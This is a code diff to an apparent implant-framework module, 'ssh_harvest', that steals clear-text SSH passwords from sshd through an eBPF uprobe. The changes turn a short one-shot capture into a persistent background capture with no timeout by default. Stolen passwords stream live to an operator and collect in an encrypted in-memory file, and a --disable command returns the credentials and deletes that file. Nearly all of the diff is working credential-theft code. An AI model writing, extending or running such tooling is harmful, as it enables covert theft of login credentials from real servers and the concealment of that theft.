@@ -1,19 +1,21 @@
 # ssh_harvest - capture clear-text SSH credentials with an eBPF uprobe.
 #
-# Drop-in replacement for the old ptrace-based `ssh_harvester` Go module. The
-# original attached ptrace, scanned the sshd text segment for a code pattern,
-# patched an INT3, and read a register at the trap. This version does the same
-# job without touching the traced process at all:
+# Replaces the old ptrace-based `ssh_harvester`: instead of attaching ptrace,
+# scanning the sshd text segment for a code pattern, patching an INT3, and
+# reading a register at the trap, this version does the same job without
+# touching the traced process at all:
 #
 #   1. locate the code pattern in the on-disk sshd image (ebpf_code_offset),
-#   2. attach an in-memory eBPF uprobe at that file offset
-#      (ebpf_uprobe_capture),
-#   3. drain the events map and report the credential-bearing register.
+#   2. start a long-lived in-memory eBPF uprobe at that file offset
+#      (ebpf_uprobe_start),
+#   3. stream each captured register value to the operator and to an encrypted
+#      memfs file in real time,
+#   4. stop and collect everything on `--disable` (ebpf_uprobe_stop).
 #
-# The password register and the code pattern keep their classic defaults, so a
-# plain `ssh_harvest` invocation behaves like the old module. The BPF object
-# (probe.bpf.o) is a companion file built by `make`; the loader caches it in
-# encrypted memfs and exposes it through the `module_files` global.
+# The password register and the code pattern keep their classic defaults. The
+# BPF object (probe.bpf.o) is a companion file built by `make`; the loader
+# caches it in encrypted memfs and exposes it through the `module_files`
+# global.
 
 # Default code pattern (hex bytes in memory order) that marks where sshd
 # leaves the PAM authentication result in RAX and the password in a register.
@@ -108,6 +110,12 @@ def _is_sshd(comm):
     return str_contains(str_lower(comm), "sshd")
 
 
+def _is_true(value):
+    if not value:
+        return False
+    return str_lower(value.strip()) in ("true", "1", "yes", "on")
+
+
 def _collect_credentials(events):
     # Keep the first occurrence of each distinct password. A login attempt can
     # hit several breakpoints/events before the map is drained, and the old
@@ -144,7 +152,29 @@ def _report(creds):
     print(sprintf("[*] %d credential(s) captured", len(creds)))
 
 
+def _disable():
+    # Stop the capture started by a previous invocation, report the credentials
+    # it collected, and remove its output file. Nothing running is not an error:
+    # the capture may have ended on its own via the timeout.
+    stopped = ebpf_uprobe_stop()
+    if stopped["error"]:
+        print(sprintf("[!] %s", stopped["error"]))
+        return "OK"
+    _report(_collect_credentials(stopped["events"]))
+    for out_path in stopped["out_paths"]:
+        # The file only exists once an event has been written (or spilled).
+        if exists(out_path):
+            remove(out_path)
+            print(sprintf("[*] removed %s", out_path))
+    return "OK"
+
+
 def main(*args):
+    # --disable tears the running capture down and reports what it collected.
+    disable = _is_true(args[5]) if len(args) > 5 else False
+    if disable:
+        return _disable()
+
     if not (has_cap("CAP_BPF") or has_cap("CAP_SYS_ADMIN")):
         print(
             "[!] missing CAP_BPF/CAP_SYS_ADMIN; eBPF uprobe capture requires one of them"
@@ -164,8 +194,9 @@ def main(*args):
         return "ERROR: unknown register"
 
     pattern = args[1].strip() if len(args) > 1 and args[1] else DEFAULT_PATTERN
-    timeout_s = 10
-    if len(args) > 2 and args[2]:
+
+    timeout_s = 0
+    if len(args) > 2 and args[2].strip():
         timeout_s = int(args[2])
         if timeout_s < 0:
             print("[!] timeout must not be negative")
@@ -209,7 +240,11 @@ def main(*args):
         )
     )
 
-    captured = ebpf_uprobe_capture(
+    # Start the capture in the background so this invocation returns at once.
+    # Events are appended to an encrypted memfs file (and streamed live); the
+    # operator can read that file whenever, and `--disable` reports the final
+    # set. timeout_ms=0 keeps it attached until stopped.
+    started = ebpf_uprobe_start(
         image=image,
         path=path,
         offset=offset,
@@ -218,10 +253,26 @@ def main(*args):
         pid=pid,
         timeout_ms=timeout_s * 1000,
     )
-    if captured["error"]:
-        print(sprintf("[!] uprobe capture: %s", captured["error"]))
+    if started["error"]:
+        print(sprintf("[!] starting capture: %s", started["error"]))
         return "ERROR: capture failed"
 
-    creds = _collect_credentials(captured["events"])
-    _report(creds)
+    if timeout_s > 0:
+        print(
+            sprintf(
+                "[*] capture %s active for %d second(s); credentials stream live and accumulate in %s",
+                started["id"],
+                timeout_s,
+                started["out_path"],
+            )
+        )
+    else:
+        print(
+            sprintf(
+                "[*] capture %s active until stopped; credentials stream live and accumulate in %s",
+                started["id"],
+                started["out_path"],
+            )
+        )
+    print("[*] run `ssh_harvest --disable` to stop it and collect the credentials")
     return "OK"
